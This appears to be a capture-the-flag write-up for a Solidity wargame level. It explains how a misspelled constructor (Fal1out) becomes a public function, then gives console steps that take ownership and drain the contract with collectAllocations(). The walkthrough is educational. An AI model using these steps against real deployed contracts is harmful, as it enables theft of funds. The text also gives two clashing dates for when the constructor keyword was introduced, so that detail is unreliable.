# Level 2: Fallout

**Difficulty:** Easy

**Vulnerability:** Typo in constructor name makes it a callable public function

---

## How it Works

The contract is an allocation system. Here's what each function does:

- **`Fal1out()`** — meant to be the constructor but isn't (see below). Sets the caller as owner.
- **`allocate()`** — lets anyone deposit ETH in. Has the `payable` keyword on the function, so it accepts incoming ETH. Deposits are recorded in `allocations[address]`.
- **`sendAllocation(address allocator)`** — lets anyone withdraw their own allocation. The `payable` here is on the *parameter* (the recipient address), not the function — so ETH can only go out, not in. No access control, but only the recorded balance for that address can be withdrawn.
- **`collectAllocations()`** — owner only. Drains the entire contract balance to the owner.
- **`allocatorBalance(address allocator)`** — read-only. Returns how much ETH an address has allocated.

### How to spot a drain function

Look for two things together:
1. **`transfer()` or `call{value:}()`** — these send ETH out of the contract
2. **`address(this).balance`** — this means the *entire* contract balance

If both are present, that's a drain. `onlyOwner` is a bonus signal but not required — sometimes drain functions have no access control at all, which is even worse.

---

## A Note on Solidity Versions

The contract runs on Solidity `^0.6.0`. Here's the timeline of how constructors evolved:

- **Before 0.4.23** — constructors were defined by naming a function the same as the contract. If the names matched, it ran on deploy. If they didn't, it was silently treated as a plain public function.
- **0.4.23** — the `constructor` keyword was introduced and the old pattern was *deprecated* (compiler warning, still compiled).
- **0.5.0** — the old pattern became a *compile error*.

Here's the catch: the compile error only triggers when the function name *matches* the contract name. If it doesn't match (like `Fal1out` vs `Fallout`), the compiler in 0.6.0 just sees a plain public function and moves on without warning. That's exactly what happened here.

```solidity
// Safe — use this from 0.4.23 onwards
constructor() public payable { ... }

// Compile error in 0.5.0+ only if name matches contract
// A typo silently makes it a callable public function
function Fal1out() public payable { ... }
```

In Solidity 0.5.0 and above, the `constructor` keyword is the only way to define a constructor, so this class of bug is impossible.

---

## Exploit Steps

1. Call `Fal1out()` directly — it was never run as a constructor so it just executes now, setting the caller as owner:
```js
await contract.Fal1out()
```

2. Confirm ownership changed:
```js
await contract.owner()  // should return your player address
```

3. Drain the contract:
```js
await contract.collectAllocations()
```

4. Confirm balance is zero:
```js
await getBalance(instance)  // → "0"
```

---

## Key Takeaway

A single character typo (`1` instead of `l`) turned the constructor into a public function anyone could call. No complex exploit logic needed — just calling a function that should never have been callable.

This is why the `constructor` keyword was introduced in Solidity 0.5.0. It removes the dependency on naming entirely, making this class of bug impossible.

**Always check the Solidity version of a contract** — older versions may have patterns that look intentional but are actually dangerous by design.

**Vulnerability category:** Access Control / Constructor Misuse
